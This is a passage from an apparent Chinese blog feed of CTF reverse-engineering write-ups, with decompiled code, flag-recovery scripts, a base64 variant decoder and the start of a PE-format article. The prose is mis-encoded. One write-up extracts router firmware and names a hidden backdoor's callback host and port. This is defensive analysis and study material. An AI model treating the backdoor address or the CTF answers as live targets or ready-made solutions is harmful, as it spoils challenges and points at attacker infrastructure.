class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">88</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">104</span>, <span class="number">106</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">114</span>&#125;;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> v4[] = &#123;<span class="number">0x22</span>, <span class="number">0x3f</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0xffffffa7</span>, <span class="number">0x31</span>, <span class="number">0xfffffff1</span>, <span class="number">0x28</span>, <span class="number">0xffffff84</span>, <span class="number">0xffffffc1</span>, <span class="number">0x1e</span>, <span class="number">0x7a</span>&#125;;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;&#125;; <span class="comment">// [esp+13h] [ebp-E5h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> z; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> x; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line">  x = <span class="number">15</span>;</span><br><span class="line">  z = <span class="number">15</span>;</span><br><span class="line">  m = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="built_in">strlen</span>(order) - <span class="number">1</span>;k&gt;=<span class="number">0</span>;k--)<span class="comment">//ä»åå¾€å‰</span></span><br><span class="line">  &#123;</span><br><span class="line">i = order[k];</span><br><span class="line">    <span class="keyword">switch</span> ( opcode[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">--x;</span><br><span class="line">--z;</span><br><span class="line">        v5 = v4[z];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        flag[x] = v5 - opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        flag[x] = v5 + opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        flag[x] = v5 ^ opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        flag[x] = v5 / opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v5 = flag[--m];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        flag[x] = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        flag[x] = v5 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤ªä¸ç†Ÿäº†ã€‚ã€‚</p><h1 id="0x22-firmware"><a href="#0x22-firmware" class="headerlink" title="0x22.firmware"></a>0x22.firmware</h1><p>binwalkæå–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€$ binwalk -e 51475f91-7b90-41dd-81a3-8b82df4f29d0.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             TP-Link firmware header, firmware version: 1.-20432.3, image version: <span class="string">&quot;&quot;</span>, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0</span><br><span class="line">69424         0x10F30         Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 64</span><br><span class="line">94080         0x16F80         U-Boot version string, <span class="string">&quot;U-Boot 1.1.4 (Aug 26 2013 - 09:07:51)&quot;</span></span><br><span class="line">94256         0x17030         CRC32 polynomial table, big endian</span><br><span class="line">131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: <span class="string">&quot;&quot;</span>, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0</span><br><span class="line">132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2203728 bytes</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor <span class="string">&#x27;sasquatch -p 1 -le -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span>: [Errno 2] No such file or directory: <span class="string">&#x27;sasquatch&#x27;</span>, <span class="string">&#x27;sasquatch -p 1 -le -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span> might not be installed correctly</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor <span class="string">&#x27;sasquatch -p 1 -be -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span>: [Errno 2] No such file or directory: <span class="string">&#x27;sasquatch&#x27;</span>, <span class="string">&#x27;sasquatch -p 1 -be -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span> might not be installed correctly</span><br><span class="line">1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2774624 bytes, 519 inodes, blocksize: 131072 bytes, created: 2015-04-13 09:35:04</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­</p><blockquote><p>  SquashFS æ˜¯ä¸€å¥—åŸºäºLinuxå†…æ ¸ä½¿ç”¨çš„å‹ç¼©åªè¯»æ–‡ä»¶ç³»ç»Ÿ</p></blockquote><p>éœ€è¦ç”¨åˆ° <strong>firmware-mod-kit</strong>è§£å‹ï¼Œå®‰è£…æ–¹æ³•ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line"><span class="built_in">cd</span> firmware-mod-kit/src</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>è§£å‹æ–‡ä»¶ç³»ç»Ÿï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop/_51475f91-7b90-41dd-81a3-8b82df4f29d0.bin.extracted$ /home/gwt/firmware-mod-kit/unsquashfs_all.sh  120200.squashfs </span><br><span class="line">/home/gwt/firmware-mod-kit/unsquashfs_all.sh: line 85: ./src/binwalk: No such file or directory</span><br><span class="line">Attempting to extract SquashFS .X file system...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trying ./src/squashfs-2.1-r2/unsquashfs... </span><br><span class="line">Trying ./src/squashfs-2.1-r2/unsquashfs-lzma... </span><br><span class="line">Trying ./src/squashfs-3.0/unsquashfs... </span><br><span class="line">Trying ./src/squashfs-3.0/unsquashfs-lzma... </span><br><span class="line">Trying ./src/squashfs-3.0-lzma-damn-small-variant/unsquashfs-lzma... </span><br><span class="line">Trying ./src/others/squashfs-2.0-nb4/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.0-e2100/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.0-e2100/unsquashfs-lzma... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-lzma/squashfs3.2-r2/squashfs-tools/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-hg612-lzma/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-wnr1000/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-rtn12/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.3/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.3-lzma/squashfs3.3/squashfs-tools/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.3-grml-lzma/squashfs3.3/squashfs-tools/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.4-cisco/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.4-nb4/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.4-nb4/unsquashfs-lzma... </span><br><span class="line">Trying ./src/others/squashfs-4.2-official/unsquashfs... Parallel unsquashfs: Using 1 processor</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.2/unsquashfs... Parallel unsquashfs: Using 1 processor</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.0-lzma/unsquashfs-lzma... Parallel unsquashfs: Using 1 processor</span><br><span class="line">480 inodes (523 blocks) to write</span><br><span class="line"></span><br><span class="line">[==================================================================================================-               ] 454/523  86%</span><br><span class="line">created 341 files</span><br><span class="line">created 39 directories</span><br><span class="line">created 70 symlinks</span><br><span class="line">created 0 devices</span><br><span class="line">created 0 fifos</span><br><span class="line">File system sucessfully extracted!</span><br><span class="line">MKFS=<span class="string">&quot;./src/others/squashfs-4.0-lzma/mksquashfs-lzma&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°backdooræ–‡ä»¶ï¼Œå»upxå£³ï¼Œç„¶åç›´æ¥æ‰¾åˆ°ï¼š<code>echo.byethost51.com:36667</code></p><h1 id="0x23-GUET-CTF2019-number-game-æœªå®Œï¼Œè®°å¾—åŠ¨è°ƒ"><a href="#0x23-GUET-CTF2019-number-game-æœªå®Œï¼Œè®°å¾—åŠ¨è°ƒ" class="headerlink" title="0x23.[GUET-CTF2019]number_game(æœªå®Œï¼Œè®°å¾—åŠ¨è°ƒ)"></a>0x23.[GUET-CTF2019]number_game(æœªå®Œï¼Œè®°å¾—åŠ¨è°ƒ)</h1><p>å…ˆçœ‹äº†ä¸‹æµç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( sub_4006D6(&amp;v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_400758(&amp;v5, <span class="number">0LL</span>, <span class="number">10LL</span>);</span><br><span class="line">    sub_400807(v4, &amp;v7);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    sub_400881(&amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( sub_400917() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;TQL!&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;your are cxk!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡äº†å‡ æ¬¡å˜æ¢ï¼Œé‡è¦çš„æ˜¯è¿™ä¸ªï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400917</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = j + <span class="number">1</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(&amp;byte_601060 + <span class="number">5</span> * i + j) == *(&amp;byte_601060 + <span class="number">5</span> * i + k) )</span><br><span class="line">          v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(&amp;byte_601060 + <span class="number">5</span> * j + i) == *(&amp;byte_601060 + <span class="number">5</span> * k + i) )</span><br><span class="line">          v1 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯ä¸ª5*5çš„ä¸œè¥¿ï¼Œå‘ç°äº†ï¼š<code>14#2330#1#0#23##3##042##1</code></p><p>æ˜¯å’Œæ•°ç‹¬å·®ä¸å¤šçš„ä¸œè¥¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14#23</span><br><span class="line">30#1#</span><br><span class="line">0#23#</span><br><span class="line">#3##0</span><br><span class="line">42##1</span><br></pre></td></tr></table></figure><p>çœ‹äº†å¥½å¤šwpç»ˆäºçœ‹æ‡‚äº†ï¼Œä»–ä¸Šé¢çš„åˆ¤æ–­åªæ˜¯åˆ¤æ–­äº†æ¯ä¸€è¡Œå’Œæ¯ä¸€åˆ—ä¸èƒ½æœ‰ç›¸åŒçš„è€Œå·²ï¼Œsoï¼š<code>0 4 2 1 4 2 1 4 3 0</code> </p><p>è¾“å‡º0123456789åŠ¨è°ƒä¸‹ï¼ˆè¿™ä¸ªç­‰æ˜å¤©è°ƒï¼Œ<a href="https://blog.csdn.net/Palmer9/article/details/104613420%EF%BC%89%EF%BC%8C%EF%BC%88%E6%88%96%E8%80%85%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E4%BB%A5%E4%B8%8A%E7%9A%84%E4%BB%A3%E7%A0%81%E7%9C%8B%E5%87%BA%EF%BC%89">https://blog.csdn.net/Palmer9/article/details/104613420ï¼‰ï¼Œï¼ˆæˆ–è€…å¯ä»¥æ ¹æ®ä»¥ä¸Šçš„ä»£ç çœ‹å‡ºï¼‰</a></p><p>å¾—åˆ°ï¼š0123456789 â€”&gt; 7381940526ï¼Œæœ€åexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">model = [<span class="number">7</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>]</span><br><span class="line">s = [<span class="number">48</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">48</span>]</span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    flag[model[i]] = <span class="built_in">chr</span>(s[i])</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x24-ç‰¹æ®Šçš„-BASE64"><a href="#0x24-ç‰¹æ®Šçš„-BASE64" class="headerlink" title="0x24.ç‰¹æ®Šçš„ BASE64"></a>0x24.ç‰¹æ®Šçš„ BASE64</h1><p>æ— å£³ï¼Œå˜è¡¨base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1, string2))))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰å†™è¿‡ä¸€éƒ¨åˆ†reçš„é¢˜è§£ï¼Œæœ€è¿‘åˆæœ‰ç‚¹æƒ³æreäº†ï¼Œé‡æ¥å§ã€‚(ä»01å¼€å§‹è®¡)&lt;/p&gt;
&lt;h1 id=&quot;0x01-ç®€å•æ³¨å†Œå™¨&quot;&gt;&lt;a href=&quot;#0x01-ç®€å•æ³¨å†Œå™¨&quot; class=&quot;headerlink&quot; title=&quot;0x01.ç®€å•æ³¨å†Œå™¨&quot;&gt;&lt;/a&gt;0x01.ç®€å•æ³¨å†Œå™¨&lt;/</summary>
      
    
    
    
    
    <category term="RE" scheme="http://example.com/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>å†æˆ˜PEç»“æ„</title>
    <link href="http://example.com/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</id>
    <published>2021-10-22T16:00:00.000Z</published>
    <updated>2021-11-27T05:56:15.423Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="PEæ–‡ä»¶ç»“æ„è§£æ"><a href="#PEæ–‡ä»¶ç»“æ„è§£æ" class="headerlink" title="PEæ–‡ä»¶ç»“æ„è§£æ"></a>PEæ–‡ä»¶ç»“æ„è§£æ</h1><h2 id="0-æ€»è¿°"><a href="#0-æ€»è¿°" class="headerlink" title="0.æ€»è¿°"></a>0.æ€»è¿°</h2><p>å¤§è‡´ç»“æ„å¦‚ä¸‹ï¼š</p><ol><li> DOSå¤´ï¼ˆå ä½ï¼‰ï¼Œä»…é€‚ç”¨äºæ˜ åƒæ–‡ä»¶</li><li> DOSå­˜æ ¹ï¼ˆåˆå«ç­¾åï¼‰ï¼Œä»…é€‚ç”¨äºæ˜ åƒæ–‡ä»¶</li><li> COFFæ–‡ä»¶å¤´ï¼Œé€‚ç”¨äºæ˜ åƒæ–‡ä»¶å’Œç›®æ ‡æ–‡ä»¶</li><li> NTï¼ˆå¯é€‰æ–‡ä»¶å¤´ï¼‰ï¼Œä»…é€‚ç”¨äºæ˜ åƒæ–‡ä»¶</li><li> èŠ‚è¡¨ï¼ˆèŠ‚åŒºå¤´ï¼‰</li><li> èŠ‚</li></ol><p>å…¶ä¸­ï¼ŒPEå¤´åŒ…å«DOSå¤´ã€DOSå­˜æ ¹ã€NTå¤´ã€èŠ‚è¡¨ã€‚</p><p>ç”¨åˆ°çš„ç»“æ„ä½“éƒ½åœ¨<code>winnt.h</code>å¤´æ–‡ä»¶ä¸­ã€‚</p><h2 id="1-DOSå¤´"><a href="#1-DOSå¤´" class="headerlink" title="1.DOSå¤´"></a>1.DOSå¤´</h2><p>Mzé‚£é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>é‡è¦çš„åªæœ‰æœ€åçš„ï¼š<code>e_lfanew</code>ï¼Œè¡¨ç¤ºNTå¤´çš„åç§»</p><h2 id="2-DOSå­˜æ ¹"><a href="#2-DOSå­˜æ ¹" class="headerlink" title="2.DOSå­˜æ ¹"></a>2.DOSå­˜æ ¹</h2><p>å°±æ˜¯<code>This program cannot 